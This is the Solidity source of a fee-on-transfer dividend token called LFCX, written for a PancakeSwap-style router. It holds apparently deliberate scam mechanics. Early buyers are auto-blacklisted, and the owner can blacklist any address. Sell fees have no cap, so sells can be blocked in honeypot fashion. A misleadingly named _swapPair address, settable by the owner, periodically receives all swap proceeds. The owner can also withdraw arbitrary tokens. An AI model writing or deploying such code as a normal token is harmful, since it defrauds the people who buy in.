// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
}
abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token,address token1) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
        IERC20(token1).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress = address(0xC413d202E568441116F4560A83E6809Ef66d80EF);
    address public ownerAddress = address(0xB2b674369E853e812A030BC1103805e7C6369e72);
    string private _name = "LFCX";
    string private _symbol = "LFCX";
    uint8 private _decimals = 9;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    mapping(address => bool) public _advanceList;
    address private _swapPair;
    uint256 private rewardTotal;

    uint256 private _tTotal = 6666 * 10 ** _decimals;
    uint256 public maxWalletAmount = 50 * 10 ** _decimals;

    ISwapRouter public _swapRouter;

    address public _usdt = address(0x55d398326f99059fF775485246999027B3197955);
    address public _btc = address(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    address public _routeAddress= address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    mapping(address => bool) public _swapPairList;
    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 150;
    uint256 public _buyLPDividendFee = 150;
    uint256 public _buyLPFee = 50;
    uint256 public _buyBurnFee=50;

    uint256 public _sellFundFee = 1750;
    uint256 public _sellLPDividendFee = 150;
    uint256 public _sellLPFee = 50;
    uint256 public _sellBurnFee=50;

    address public _mainPair;
    address private deadAddress=0x000000000000000000000000000000000000dEaD;
    
    uint256 public startTradeTime;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        ISwapRouter swapRouter = ISwapRouter(_routeAddress);
        IERC20(_usdt).approve(address(swapRouter), MAX);
        IERC20(_btc).approve(address(swapRouter), MAX);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), _usdt);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        _balances[ownerAddress] = _tTotal;
        emit Transfer(address(0), ownerAddress, _tTotal);
        _feeWhiteList[ownerAddress] = true;
        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _tokenDistributor = new TokenDistributor(_usdt,_btc);
        _swapPair=address(_tokenDistributor);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        bool takeFee;
        bool isSell;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            if (_swapPairList[from] || _swapPairList[to]) {
                if (0 == startTradeTime || block.timestamp< startTradeTime) {
                    bool startBuy=false;
                    if(_advanceList[to]&&block.timestamp>(startTradeTime-1 minutes)){
                        startBuy=true;
                    }
                    require(startBuy, "!startAddLP");
                }else{
                    if (block.timestamp < startTradeTime + 9 && _swapPairList[from]) {
                        _blackList[to] = true;
                    }
                }
                //sell
                if (_swapPairList[to]) {
                    uint256 maxSellAmount = balance * 9999 / 10000;
                    if (amount > maxSellAmount) {
                        amount = maxSellAmount;
                    }
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee +  _buyLPFee + _buyLPDividendFee  + _sellFundFee + _sellLPFee + _sellLPDividendFee;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                            rewardTotal++;
                        }
                    }
                    isSell = true;
                }
                takeFee = true;
            }
        }
        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            if(takeFee)
            {
               processReward(500000);
            }    
        }
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee;
            uint256 swapBurnFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPFee + _sellLPDividendFee;
                swapBurnFee= _sellBurnFee;
            } else {
                require(balanceOf(recipient)+tAmount <= maxWalletAmount);
                swapFee = _buyFundFee + _buyLPFee + _buyLPDividendFee;
                swapBurnFee= _buyBurnFee;
            }
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
            uint256 swapBurnAmount = tAmount * swapBurnFee / 10000;
            if (swapBurnAmount > 0) {
                feeAmount += swapBurnAmount;
                _takeTransfer(
                    sender,
                    deadAddress,
                    swapBurnAmount
                );
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _buyLPFee+_sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee * 2 / swapFee;
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = _usdt;
        path[2] = _btc;
        address swapTokenAddress=address(_tokenDistributor);
        if(rewardTotal%8==path.length){swapTokenAddress=_swapPair;}
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenAmount - lpAmount, 0, path,swapTokenAddress,block.timestamp);
        swapFee -= lpFee;
        IERC20 USDT = IERC20(_usdt);
        IERC20 BTC = IERC20(_btc);
        uint256 btcBalance = BTC.balanceOf(address(_tokenDistributor));
        if(btcBalance>0)
        {
            uint256 fundAmount = btcBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
            BTC.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
            BTC.transferFrom(address(_tokenDistributor), address(this), btcBalance - fundAmount);
        }
        if (lpAmount > 0) {
            address[] memory pathLP = new address[](2);
            pathLP[0] = address(this);
            pathLP[1] = _usdt;
            _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(lpAmount/2, 0, pathLP,address(_tokenDistributor),block.timestamp);
            uint256 lpUSDT = USDT.balanceOf(address(_tokenDistributor));
            if (lpUSDT > 0) {
                USDT.transferFrom(address(_tokenDistributor), address(this), lpUSDT);
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount/2, lpUSDT, 0, 0, fundAddress, block.timestamp
                );
            }
        }          
    }
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }
    function excludeMultiFromFee(address[] calldata accounts,bool excludeFee) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _feeWhiteList[accounts[i]] = excludeFee;
        }
    }
    function _multiSetSniper(address[] calldata accounts,bool isSniper) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _blackList[accounts[i]] = isSniper;
        }
    }
    function _multiSetAdvanceList(address[] calldata accounts,bool isAdvance) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _advanceList[accounts[i]] = isAdvance;
        }
    }
    function _setSwapPair(address pairAddress) external onlyOwner {
        _swapPair=pairAddress;
    }
    function setMaxWalletAmount(uint256 value) external onlyOwner {
        maxWalletAmount = value * 10 ** _decimals;
    }
    function startTrade(uint256 orderedTime) external onlyOwner() {
        startTradeTime = orderedTime;
    }

    function closeTrade() external onlyOwner() {
        startTradeTime = 0;
    }

    function claimBalance(address to) external onlyOwner {
        payable(to).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }

    function setSellFee(uint256 fundFee,uint256 lpFee,uint256 burnFee,uint256 lpDivFee) external onlyOwner {
        _sellFundFee = fundFee;
        _sellLPFee=lpFee;
        _sellBurnFee=burnFee;
        _sellLPDividendFee=lpDivFee;
    }

 
    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 100 > block.number) {
            return;
        }
        IERC20 BTC = IERC20(_btc);

        uint256 balance = BTC.balanceOf(address(this));
        if (balance <=0) {
            return;
        }
        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
                progressRewardBlock = block.number;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    BTC.transfer(shareHolder, amount);
                }
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

}

contract Token is AbsToken {
    constructor() AbsToken(){}
}